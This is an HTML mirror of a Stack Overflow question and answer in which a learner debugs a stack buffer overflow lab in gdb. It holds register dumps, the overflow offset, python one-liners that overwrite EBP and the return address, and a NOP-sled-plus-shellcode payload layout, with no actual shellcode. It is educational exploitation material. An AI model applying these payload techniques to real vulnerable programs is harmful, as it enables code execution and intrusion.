@@ -1,0 +1,105 @@
+<!DOCTYPE html><html lang="en"><head><title>Error in return address while simulating buffer overflow</title><link rel="stylesheet" href="/assets/main-css-J70jL4xZ9XDhEm610THio-liXvZQr6xchX4qGk0EF54.css" integrity="sha256-J70jL4xZ9XDhEm610THio+liXvZQr6xchX4qGk0EF54="/><link rel="canonical" href="https://windows-hexerror.linestarve.com/q/so31245474-error-in-return-address-while-simulating-buffer-overflow"><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
+	google_ad_client: "ca-pub-1525579576977352",
+	enable_page_level_ads: true
+});
+</script></head><body><div class="container markdown-body" itemscope itemtype="http://schema.org/Question"><h1 itemprop="name">Error in return address while simulating buffer overflow</h1><div class="qa-container qa-full first-of-type"><div class="qa-sidebar"><div class="qa-voteinfo tooltipped tooltipped-e tooltipped-no-delay" aria-label="Sorry, you can't vote on questions yet."><div class="votearrow">&#x25b2;</div><span itemprop="upvoteCount">2</span><br><div class="votearrow">&#x25bc;</div></div><!-- TODO accepted?--></div><div class="qa-body"><div itemprop="text"><p>I am learning buffer overflow from the following <a href="https://samsclass.info/127/proj/lbuf1.htm" rel="nofollow">website</a>.</p>
+
+<pre><code>(gdb)info registers
+eax            0xbffff4c0   -1073744704
+ecx            0xbffff4bf   -1073744705
+edx            0x2  2
+ebx            0xb7fccff4   -1208168460
+esp            0xbffff4a0   0xbffff4a0
+ebp            0xbffff528   0xbffff528
+esi            0x8048450    134513744
+edi            0x8048340    134513472
+eip            0x804841f    0x804841f &lt;main+43&gt;
+eflags         0x246    [ PF ZF IF ]
+cs             0x73 115
+ss             0x7b 123
+ds             0x7b 123
+es             0x7b 123
+fs             0x0  0
+gs             0x33 51
+
+(gdb) x/40x $esp
+0xbffff4a0: 0xbffff4c0  0xbffff728  0x00000000  0xbffff570
+0xbffff4b0: 0xb7fff670  0x08048249  0x00000000  0x00000000
+0xbffff4c0: 0x00000041  0x00000000  0xb7fe3000  0x00000000
+0xbffff4d0: 0x00000000  0x00000000  0x00000000  0x00000000
+0xbffff4e0: 0x00000000  0x00000000  0x00000000  0x00000000
+0xbffff4f0: 0x00000000  0x00000000  0xbffff711  0xb7edd04e
+0xbffff500: 0xb7f8f329  0x08049ff4  0xbffff518  0x080482e8
+0xbffff510: 0xb7fccff4  0x08049ff4  0xbffff538  0x08048469
+0xbffff520: 0xb7ff07b0  0xbffff540  0xbffff598  0xb7e84775
+0xbffff530: 0x08048450  0x08048340  0xbffff598  0xb7e84775
+</code></pre>
+
+<p>Now according to the website, 0xb7e84775 should be replaced by the return address. (Address : 0xbffff52c)
+But, I tried running and it is looks for the return address at 0xbffff524.</p>
+
+<p>Also when I tried using a NOP sled as the website shows, and put the return address of the sled where it was expecting, it ran, but it gave the following error.</p>
+
+<pre><code>Program received signal SIGSEGV, Segmentation fault.
+0x90909090 in ?? ()
+</code></pre>
+
+<p>I am not sure why it was looking for the return address before $ebp, and I have no clue about the error.</p>
+
+<p>Can anyone kindly help? Please let me know if anything else is needed. </p>
+</div><div class="tags"><div class="tag">c</div><div class="tag">gdb</div><div class="tag">buffer-overflow</div></div><div class="qa-attribution">asked <a href="https://stackoverflow.com/questions/31245474/error-in-return-address-while-simulating-buffer-overflow">on Stack Overflow</a> Jul 6, 2015 by <a href="https://stackoverflow.com/users/2335836/psyc0der"><img src="https://www.gravatar.com/avatar/3cb717e239acfb85a3f708d31747de65?s=16&amp;d=identicon&amp;r=PG&amp;f=1" width="16" height="16" alt=""> psyc0der</a></div></div></div><h2><span itemprop="answerCount">1</span> Answer</h2><div class="qa-container qa-full first-of-type" id="sx-stackoverflow-31281335" itemscope itemtype="http://schema.org/Answer"><div class="qa-sidebar"><div class="qa-voteinfo tooltipped tooltipped-e tooltipped-no-delay" aria-label="Sorry, you can't vote on answers yet."><div class="votearrow">&#x25b2;</div><span itemprop="upvoteCount">1</span><br><div class="votearrow">&#x25bc;</div></div><!-- TODO accepted?--></div><div class="qa-body"><div itemprop="text"><p>It gave you 'Segmentation fault', simply because you put so many NOP sleds and that's the reason, why you overwrote return address with it and program crashed.</p>
+
+<p>Offset is 112 bytes, it means, next 4 bytes will overwite return address. Just try this in your gdb -</p>
+
+<pre><code>run `python -c 'print "\x90" * 112 + "A" * 4'`
+</code></pre>
+
+<p>Result -</p>
+
+<pre><code>Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+</code></pre>
+
+<p>But what I want to say. You have overwrite return address with address what points somewhere between NOP sled. And why are you looking for address before $ebp? Because your return address, where you want to jump is situated before it.</p>
+
+<p>Your payload looks like this (I just a little modified it, for showing you, where is located EBP and why you must use address what is located before it) -</p>
+
+<pre><code>[NOP sled] + [Shellcode] + [Padding] + [EBP] + [EIP/return address]
+</code></pre>
+
+<ul>
+<li><p>NOP sled -> 64 bytes, somewhere between them you'll jump</p></li>
+<li><p>Shellcode -> 32 bytes, for getting shell</p></li>
+<li><p>Padding -> 8 bytes, name talks about all</p></li>
+<li>EBP -> 4 bytes, we'll overwrite EBP with some value, for better
+understanding.. as now you can see, it's placed 4 bytes before our
+EIP/return address, but our return address, where we want to jump, is
+located almost on the top of the stack.. otherwise EBP = bottom of
+the actual frame</li>
+<li>EIP/return address -> 4 bytes, points somewhere between NOPs</li>
+</ul>
+
+<p>If you want (for better understanding), simulate it in your gdb.</p>
+
+<pre><code>run `python -c 'print "\x90" * 64 + "B" * 32 + "A" * 12 + "\xef\xbe\xad\xde" + "\x50\xf4\xff\xbf"'`
+</code></pre>
+
+<p>"B" - simulate shellcode</p>
+
+<p>"\xef\xbe\xad\xde" = deadbeef will overwrite EBP</p>
+
+<pre><code>(gdb) i r
+eax            0x6  6    
+ecx            0xb7fda000   -1208115200    
+edx            0xb7fbc898   -1208235880    
+ebx            0xb7fbb000   -1208242176    
+esp            0xbfffef90   0xbfffef90    
+ebp            0xdeadbeef   0xdeadbeef    
+esi            0x0  0    
+edi            0x0  0    
+eip            0x43434343   0x43434343    
+...
+</code></pre>
+
+<p>In real way (with shellcode), it will jump on address 0xbffff450, slide down and execute your shellcode, then you'll get a shell.</p>
+</div><div class="qa-attribution">answered <a href="https://stackoverflow.com/questions/31245474/error-in-return-address-while-simulating-buffer-overflow/31281335#31281335">on Stack Overflow</a> Jul 7, 2015 by <a href="https://stackoverflow.com/users/4099491/yeez"><img src="https://i.stack.imgur.com/YZJqM.jpg?s=16&amp;g=1" width="16" height="16" alt=""> Yeez</a></div></div></div><hr><p class="container">User contributions licensed under <a href="https://creativecommons.org/licenses/by-sa/3.0/">CC BY-SA 3.0</a></p><script type="text/javascript" src="/assets/vend-js-ECgNvG-oXgP7Ca24MRcZ831qDcNq2M5AahAhJRksgtI.js" integrity="sha256-ECgNvG+oXgP7Ca24MRcZ831qDcNq2M5AahAhJRksgtI="></script><script type="text/javascript" src="/assets/cust-js-ZONKvaIwPRDoYEqWdyhagYZfqo_vT6evY1jwUSHh31o.js" integrity="sha256-ZONKvaIwPRDoYEqWdyhagYZfqo/vT6evY1jwUSHh31o="></script><script src="https://analytics.linestarve.com/piwik.js"></script><noscript><p><img src="https://analytics.linestarve.com/piwik.php?idsite=6&amp;rec=1" style="border:0;" alt=""></p></noscript></div></body></html>
